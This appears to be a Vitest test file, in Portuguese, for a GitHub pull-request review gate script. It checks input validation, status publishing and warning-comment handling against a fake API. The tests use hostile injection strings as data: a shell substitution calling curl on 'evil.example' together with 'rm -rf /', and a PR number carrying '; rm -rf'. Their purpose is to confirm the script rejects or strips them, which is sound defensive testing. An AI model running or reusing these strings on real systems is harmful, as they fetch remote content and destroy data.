// T062 · contracts/review-gate.md §Saídas — scripts/review/gate.ts com fetch falso
// (FR-006, FR-008, FR-010, FR-026).
import { describe, expect, it, vi } from "vitest";
import { runGate } from "../../../scripts/review/gate";
import { R, createFakeFetch, type Route } from "./fixtures/fake-fetch";
import {
  HEAD,
  apiCompare,
  apiErrors,
  apiFiles,
  apiPull,
  geminiReview,
  issueComment,
  trailers,
  users,
  verdictBody,
} from "./fixtures";

const P = `${R}/pulls/42`;
const EVIL = "$(curl evil.example) `rm -rf /`";

function routes(over: Record<string, Route> = {}): Record<string, Route> {
  return {
    [`GET ${P}`]: { body: apiPull({ body: EVIL }) },
    [`GET ${P}/commits`]: { body: [{ sha: HEAD, commit: { message: trailers.claude } }] },
    [`GET ${P}/files`]: { body: apiFiles },
    [`GET ${P}/reviews`]: { body: [geminiReview({ id: 1, at: "2026-10-06T10:00:00Z" })] },
    [`GET ${P}/comments`]: { body: [] },
    [`GET ${R}/issues/42/comments`]: { body: [] },
    [`GET ${R}/contents/specs/999-exemplo/spec.md`]: { body: { content: "" } },
    [`GET ${R}/compare/main...${HEAD}`]: { body: apiCompare() },
    [`POST ${R}/statuses/${HEAD}`]: { status: 201, body: {} },
    [`POST ${R}/issues/42/comments`]: { status: 201, body: { id: 500 } },
    [`PATCH ${R}/issues/comments/300`]: { body: {} },
    [`DELETE ${R}/issues/comments/300`]: { status: 204 },
    ...over,
  };
}

async function run(r: Record<string, Route>, env: Record<string, string | undefined> = {}) {
  const fake = createFakeFetch(r);
  const summary = vi.fn();
  const code = await runGate({
    env: { PR_NUMBER: "42", GITHUB_TOKEN: "tok", RUN_ID: "123", ...env },
    fetch: fake.fetch,
    sleep: async () => {},
    writeSummary: summary,
    log: () => {},
  });
  const writes = fake.calls.filter((c) => c.method !== "GET");
  return { code, calls: fake.calls, writes, summary };
}

const warningsByActions = (body = "<!-- prumo:avisos v1 -->\nantigo") =>
  issueComment({ id: 300, at: "2026-10-06T09:00:00Z", user: users.actions, body });
const dougVerdict = issueComment({ id: 301, at: "2026-10-06T11:00:00Z", body: verdictBody() });

describe("runGate — entrada", () => {
  it.each([undefined, "", "abc", "0", "-1", "4.2", "42; rm -rf"])(
    "PR_NUMBER inválido (%s) ⇒ exit 1 sem chamar a API",
    async (n) => {
      const { code, calls } = await run(routes(), { PR_NUMBER: n });
      expect(code).toBe(1);
      expect(calls).toHaveLength(0);
    },
  );
});

describe("runGate — status", () => {
  it("publica o status com context, state, description ≤ 140 e target_url do run", async () => {
    const { code, writes } = await run(routes());
    expect(code).toBe(0);
    const status = writes.find((w) => w.path === `${R}/statuses/${HEAD}`)!;
    expect(status.body).toEqual({
      context: "Revisão independente",
      state: "success",
      description: `APROVADO por Gemini em ${HEAD.slice(0, 7)}`,
      target_url: "https://github.com/dougueta/prumo/actions/runs/123",
    });
  });

  it("sem RUN_ID, target_url aponta para o PR", async () => {
    const { writes } = await run(routes(), { RUN_ID: undefined });
    expect((writes[0].body as { target_url: string }).target_url).toBe(
      "https://github.com/dougueta/prumo/pull/42",
    );
  });

  it("erro da API ⇒ status pending 'não foi possível avaliar…' e exit 1", async () => {
    const { code, writes } = await run(routes({ [`GET ${P}/reviews`]: apiErrors.serverError }));
    expect(code).toBe(1);
    expect(writes).toHaveLength(1);
    expect(writes[0].body).toMatchObject({
      state: "pending",
      description: "não foi possível avaliar (erro da API do GitHub) — reexecute",
    });
  });

  it("erro antes de conhecer o head ⇒ exit 1 sem status", async () => {
    const { code, writes } = await run(routes({ [`GET ${P}`]: apiErrors.serverError }));
    expect(code).toBe(1);
    expect(writes).toHaveLength(0);
  });
});

describe("runGate — comentário de avisos (FR-010)", () => {
  it("cria o comentário quando há avisos e não existe", async () => {
    const { writes, summary } = await run(
      routes({ [`GET ${R}/issues/42/comments`]: { body: [dougVerdict] } }),
    );
    const post = writes.find((w) => w.method === "POST" && w.path.endsWith("/issues/42/comments"))!;
    const body = (post.body as { body: string }).body;
    expect(body.startsWith("<!-- prumo:avisos v1 -->")).toBe(true);
    expect(body).toContain("não é o revisor designado");
    expect(body).toContain(HEAD.slice(0, 7));
    expect(summary).toHaveBeenCalledWith(expect.stringContaining("não é o revisor designado"));
  });

  it("atualiza o comentário existente do github-actions[bot]", async () => {
    const { writes } = await run(
      routes({ [`GET ${R}/issues/42/comments`]: { body: [warningsByActions(), dougVerdict] } }),
    );
    expect(writes.map((w) => `${w.method} ${w.path}`)).toEqual([
      `POST ${R}/statuses/${HEAD}`,
      `PATCH ${R}/issues/comments/300`,
    ]);
  });

  it("não reescreve quando o conteúdo já é o mesmo (idempotente)", async () => {
    const first = await run(routes({ [`GET ${R}/issues/42/comments`]: { body: [dougVerdict] } }));
    const body = (first.writes[1].body as { body: string }).body;
    const { writes } = await run(
      routes({
        [`GET ${R}/issues/42/comments`]: { body: [warningsByActions(body), dougVerdict] },
      }),
    );
    expect(writes.map((w) => w.method)).toEqual(["POST"]);
  });

  it("apaga o comentário quando não há mais avisos (404 ignorado)", async () => {
    const ok = await run(
      routes({ [`GET ${R}/issues/42/comments`]: { body: [warningsByActions()] } }),
    );
    expect(ok.writes.map((w) => `${w.method} ${w.path}`)).toContain(
      `DELETE ${R}/issues/comments/300`,
    );
    const gone = await run(
      routes({
        [`GET ${R}/issues/42/comments`]: { body: [warningsByActions()] },
        [`DELETE ${R}/issues/comments/300`]: apiErrors.notFound,
      }),
    );
    expect(gone.code).toBe(0);
  });

  it("ignora comentário com o marcador publicado por outra conta", async () => {
    const fake = issueComment({
      id: 999,
      at: "2026-10-06T09:00:00Z",
      user: users.doug,
      body: "<!-- prumo:avisos v1 -->\nforjado",
    });
    const { writes } = await run(routes({ [`GET ${R}/issues/42/comments`]: { body: [fake] } }));
    expect(writes.map((w) => w.method)).toEqual(["POST"]);
  });

  it("saídas nunca contêm texto vindo do PR", async () => {
    const evilComment = issueComment({
      id: 302,
      at: "2026-10-06T11:00:00Z",
      body: `${EVIL}\n${verdictBody()}`,
    });
    const { writes, summary } = await run(
      routes({ [`GET ${R}/issues/42/comments`]: { body: [evilComment] } }),
    );
    const out = JSON.stringify([writes.map((w) => w.body), summary.mock.calls]);
    expect(out).not.toMatch(/curl|rm -rf/);
  });
});
